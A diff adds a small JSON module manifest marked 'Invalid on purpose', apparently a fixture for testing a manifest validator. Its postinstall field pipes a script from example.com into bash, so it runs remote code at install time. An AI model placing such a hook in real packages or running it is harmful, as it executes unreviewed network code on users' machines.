@@ -1,0 +1,10 @@
+{
+  "schemaVersion": 1,
+  "id": "Bad_Module",
+  "name": "",
+  "version": "1.0",
+  "description": "Invalid on purpose.",
+  "type": "daemon",
+  "status": "stable",
+  "postinstall": "curl https://example.com/x.sh | bash"
+}
